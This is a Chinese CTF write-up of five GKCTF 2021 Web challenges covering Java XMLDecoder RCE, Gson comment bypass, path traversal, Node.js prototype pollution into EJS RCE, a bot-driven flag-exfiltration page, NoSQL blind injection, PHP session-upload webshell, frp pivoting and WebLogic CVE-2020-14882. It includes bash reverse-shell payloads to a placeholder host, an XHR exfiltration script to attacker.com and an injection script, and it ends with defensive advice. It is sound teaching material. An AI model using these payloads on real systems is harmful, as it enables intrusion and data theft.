---
title: GKCTF 2021 Web 方向全题解
description: GKCTF 2021 Web 方向五道题目完整复现与分析：babycat (Java XMLDecoder RCE、Gson 注释符绕过)、easycms
  (任意文件下载)、easynode (Node.js 原型链污染 RCE、EJS 模板引擎利用)、CheckBot (SSRF/XSS 窃取 Flag)、hackme
  (NoSQL 盲注、Session Upload Progress Getshell、WebLogic CVE-2020-14882、frp 内网穿透)
category: program-analysis
tags:
- GKCTF
- CTF Writeup
- Web安全
- Java反序列化
- XMLDecoder
- Node.js
- 原型链污染
- NoSQL注入
- 盲注
- Session Upload Progress
- Getshell
- WebLogic
- CVE-2020-14882
- frp
- 内网穿透
- EJS
- Gson
- SSRF
- XSS
date: 2021-05-15
updated: '2026-11-14'
---

## 概述

本页面整理 GKCTF 2021 Web 方向五道题目的完整解题思路与利用链复现，涵盖 **Java 反序列化**、**Node.js 原型链污染**、**NoSQL 盲注**、**PHP Session 进度上传 Getshell**、**WebLogic CVE-2020-14882** 等核心漏洞类型，并结合 **frp 内网穿透** 实现内网横向移动。适合 CTF 选手、Web 安全研究人员及渗透测试工程师参考。

---

## babycat：Java XMLDecoder RCE 与 Gson 注释符绕过

### 题目入口

- 注册功能前端按钮不可点击，直接构造数据包发送注册成功
- 登录后仅 `Download Test` 可用，`Upload` 需要 admin 权限
- `Download Test` 可直接下载源码

### 核心漏洞点

#### Gson 解析器注释符绕过角色校验

源码中注册逻辑使用 Gson 解析 JSON，对 `role` 字段进行匹配替换：

```java
// 伪代码还原
for (String role : roles) {
    if (input.contains(role)) {
        input = input.replace(role, "user");
    }
}
```

Gson 支持 JSON 注释（`/* ... */`），构造 payload：

```json
{"username":"test","password":"test","role":"/*admin*/admin"}
```

匹配时 `admin` 被注释包裹不被替换，最终解析出 `role: "admin"`，成功获取管理员权限。

> **交叉引用**：Java 反序列化与安全编码参考 [[java-preparedstatement-sql-injection-defense]] 中关于输入校验的防御思路。

#### XMLDecoder 反序列化 RCE

`baseDao` 中调用 `XMLDecoder` 解析用户可控 XML，存在经典反序列化漏洞。结合 HTML 实体编码绕过内容过滤：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/bash</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1</string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```

只需登录或注册即可触发 XML 解析反弹 Shell。

> **相关技术**：XMLDecoder 利用链属于 Java 反序列化体系，类似原理可见 [[attack-defense-world-master-advanced-writeup]] 中的 PHP 反序列化题目对比学习。

---

## easycms：任意文件下载与弱口令

### 漏洞利用链

1. **弱口令登录后台**：`admin / 12345`（提示 5 位弱密码）
2. **主题导出功能存在任意文件下载**：参数 `file` 无路径遍历过滤
3. **直接下载 Flag**：`/admin/theme/export?file=../../flag.txt`

> **实战提示**：后台功能点常忽视授权与路径规范化校验，类似文件下载漏洞见 [[huxiangbei-willphp-file-inclusion-writeup]] 中的任意文件包含利用。

---

## easynode：Node.js 原型链污染 RCE 与 EJS 模板引擎利用

### 登录绕过：数组绕过字符过滤

登录处过滤注入字符，但未处理数组输入。利用 JS 特性：数组与字符串拼接会调用 `toString()` 转为逗号分隔字符串。

构造 payload：

```json
{"username":["admin'","*","'"],"password":["'","*","'"]}
```

拼接后变为 `admin',*,',*,'`，绕过 `substr` 等检查。

### 原型链污染：`extend` 合并 + `JSON.parse` 解析

`adminDIV` 路由读取用户 `DIV` 模块数据，使用 `extend` 深度合并，且通过 `JSON.parse` 解析用户输入。虽然 `JSON.parse` 不会直接解析 `__proto__`，但 `extend` 合并时会将 `__proto__` 作为普通键处理，导致原型链污染。

```javascript
// 伪代码
const userData = JSON.parse(req.body.data);
_.extend(target, userData); // lodash extend / 自定义 merge
```

### EJS 模板引擎 RCE 利用链

1. **创建污染用户**：`__proto__username=__proto__&password=1`（需 admin 权限）
2. **获取污染后的 token**
3. **构造污染 payload**（Base64 + URL 编码）：
   ```json
   {"__proto__":{"outputFunctionName":"a=1;process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/x.x.x.x/port 0>&1\"');//"}}
   ```
4. **访问 `/admin` 路由触发 EJS 渲染**，污染 `outputFunctionName` 导致代码执行

> **原理参考**：
> - [express/lodash/ejs 从原型链污染到 RCE](https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/)
> - [[vulnhub-chronos-writeup]] 中同样利用 Express-fileupload 原型链污染 + EJS 模板引擎 RCE

---

## CheckBot：SSRF/XSS 窃取本地 Flag

### 题目逻辑

- 提示本地访问 `admin.php` 给 Flag
- 页面含 `id="flag"` 标签
- 提交 URL 让机器人访问

### 利用思路

构造恶意页面，通过 `iframe` 加载 `http://localhost/admin.php`，选取 `#flag` 元素值，再用 `XMLHttpRequest` 发送到外部服务器：

```html
<iframe src="http://localhost/admin.php" onload="steal()"></iframe>
<script>
function steal() {
  const flag = this.contentDocument.getElementById('flag').innerText;
  new XMLHttpRequest().open('GET', 'http://attacker.com/?flag='+flag);
}
</script>
```

提交该页面 URL，机器人访问后回传 Flag。

> **相关技术**：跨域数据窃取、SSRF 绕过、Bot 模拟，类似场景见 [[websocket-vulnerabilities-analysis]] 中的 CSWSH 攻击。

---

## hackme：NoSQL 盲注 → Session Upload Progress Getshell → WebLogic CVE-2020-14882 → frp 内网穿透

### NoSQL 盲注绕过 Unicode 过滤

- 登录接口使用 JSON 格式，尝试永真式 `{"username":{"$ne":null},"password":{"$ne":null}}` 被拦截
- 提示使用 Unicode 编码绕过：`$ne` → `\u0024ne`
- 盲注判断依据：`{"msg":"登录了，但没完全登录"}` 为真，`{"msg":"登录失败"}` 为假

**盲注脚本核心逻辑**：

```python
import requests, string

url = "http://target/login"
chars = string.printable
flag = ""
for i in range(1, 50):
    for c in chars:
        payload = f'{{"username":"admin","password":{{"$regex":"^{flag}{c}"}}}}'
        # Unicode 编码绕过
        payload = payload.replace('$', '\\u0024')
        r = requests.post(url, json=eval(payload))
        if '登录了' in r.text:
            flag += c
            break
```

> **系统化参考**：[[mongodb-nosql-injection-guide]] 详细梳理了 MongoDB NoSQL 注入的四大手法（联合查询、JS 注入、盲注、重言式/数组注入）及实战案例。

### 任意文件读取与信息收集

登录后访问 `admin.php` 发现任意文件读取功能：

- 读取 `/etc/passwd` 确认用户
- 读取 `info.php`（phpinfo）发现 **nginx** + **PHP session.upload_progress.enabled = On**
- 读取 nginx 配置 `/usr/local/nginx/conf/nginx.conf` 发现内网 **WebLogic** 服务

### PHP Session Upload Progress Getshell

利用条件：
- `session.upload_progress.enabled = On`
- 存在文件包含点（`admin.php` 可控参数包含文件）
- 可预测/控制 `session_id`

**POC 关键点**：

```php
// 上传数据包中携带 PHP_SESSION_UPLOAD_PROGRESS
// 竞争条件写入 session 文件，包含 <?php eval($_POST[1]);?>
// 并发请求包含 session 文件触发代码执行
```

> **详细原理**：[[php-webshell-fundamentals-chopper-analysis]] 中分析了一句话木马执行流程；Session Upload Progress 利用细节可见 [[race-condition-vulnerability-analysis]] 竞争条件章节及外部参考 [浅谈 SESSION_UPLOAD_PROGRESS 的利用](https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/)。

### frp 反向代理访问内网 WebLogic

Getshell 后为蚁剑连接内网 WebLogic，部署 frp 穿透：

**frps.ini (公网 VPS)**：
```ini
[common]
bind_port = 7000
```

**frpc.ini (目标内网)**：
```ini
[common]
server_addr = x.x.x.x
server_port = 7000

[weblogic]
type = tcp
local_ip = 127.0.0.1
local_port = 7001
remote_port = 7001
```

本地访问 `localhost:7001` 即映射到内网 WebLogic 控制台。

> **工具实战**：[[frp内网渗透应用]] 详细记录了 frp 基础原理、Socks5 隧道、多级隧道、Metasploit 代理、RDP 转发等四大典型场景及完整配置示例；[[internal-network-pivoting-techniques]] 对比了 Venom、Frp、SSH 隧道、Cobalt Strike SMB Beacon 等主流横向移动工具。

### WebLogic CVE-2020-14882 读取 Flag

- 版本：`12.2.1.4.0` 正好在影响范围
- 利用项目：[CVE-2020-14882_ALL](https://github.com/GGyao/CVE-2020-14882_ALL)
- 通过 frp 代理访问控制台，执行任意命令读取 Flag

> **漏洞背景**：CVE-2020-14882 是 WebLogic 控制台身份认证绕过漏洞，结合 CVE-2020-14883 (RCE) 可无需认证执行命令。类似中间件 RCE 案例见 [[vulnhub-boredhackerblog-social-network-writeup]] 中的 Elasticsearch CVE-2015-1427 利用。

---

## 知识点总结与交叉引用索引

| 题目 | 核心技术 | 关联页面 |
|------|----------|----------|
| babycat | Java XMLDecoder RCE、Gson 注释符绕过、HTML 实体编码绕过 | [[java-preparedstatement-sql-injection-defense]], [[attack-defense-world-master-advanced-writeup]] |
| easycms | 弱口令、任意文件下载 | [[huxiangbei-willphp-file-inclusion-writeup]] |
| easynode | Node.js 原型链污染、JSON.parse/extend 合并、EJS 模板引擎 RCE、数组绕过 | [[vulnhub-chronos-writeup]], [[mongodb-nosql-injection-guide]] (原型链污染原理) |
| CheckBot | SSRF、XSS、Bot 模拟、iframe + XMLHttpRequest 数据窃取 | [[websocket-vulnerabilities-analysis]] |
| hackme | NoSQL 盲注 (Unicode 绕过)、任意文件读取、Session Upload Progress Getshell、WebLogic CVE-2020-14882、frp 内网穿透 | [[mongodb-nosql-injection-guide]], [[php-webshell-fundamentals-chopper-analysis]], [[frp内网渗透应用]], [[internal-network-pivoting-techniques]], [[vulnhub-boredhackerblog-social-network-writeup]] |

---

## 防御与修复建议

1. **Java 反序列化**：禁用 `XMLDecoder` 解析不可信数据；升级依赖；使用安全的序列化框架（如 Jackson 配合 `enableDefaultTyping` 限制）
2. **Gson/JSON 解析**：禁用注释功能（`GsonBuilder.setLenient(false)`）；严格校验字段白名单
3. **Node.js 原型链污染**：使用 `Object.create(null)` 创建无原型对象；冻结 `Object.prototype`；使用 `lodash` 4.17.21+ 修复版本；避免递归合并用户可控对象
4. **NoSQL 注入**：强制类型校验；使用 ODM 验证；禁用 `$where`、`$regex` 等高风险操作符；最小权限数据库账号
5. **PHP Session Upload Progress**：关闭 `session.upload_progress.enabled`；限制文件包含路径；使用 `open_basedir` 限制目录
6. **WebLogic**：及时应用 Oracle 补丁（CPU）；禁用控制台公网访问；配置网络 ACL 限制管理端口
7. **内网穿透**：出口流量审计；禁止非授权隧道工具；部署 EDR 监控异常进程网络连接

---

## 参考资料与延伸阅读

- [GKCTF 2021 Web Writeup 原文 (微信公众号)](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247486629&idx=1&sn=8ae774367d2aa299cfbb00d2056661d6)
- [express/lodash/ejs 从原型链污染到 RCE](https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/)
- [JavaScript 原型链污染分析](https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/)
- [浅谈 SESSION_UPLOAD_PROGRESS 的利用](https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/)
- [CVE-2020-14882_ALL 利用项目](https://github.com/GGyao/CVE-2020-14882_ALL)
- [[mongodb-nosql-injection-guide]] - MongoDB NoSQL 注入系统指南
- [[frp内网渗透应用]] - frp 内网渗透四大典型场景实战
- [[internal-network-pivoting-techniques]] - 内网穿透/横向移动核心技术体系对比
- [[vulnhub-chronos-writeup]] - VulnHub Chronos 靶机原型链污染 RCE 复现
- [[php-webshell-fundamentals-chopper-analysis]] - PHP 一句话木马与蚁剑连接流程分析
- [[attack-defense-world-master-advanced-writeup]] - 攻防世界高手进阶区 18 题全解含反序列化专题

## 来源

- [0x00实验室-202108-202304_067](../sources/0x00实验室-202108-202304_067.md)
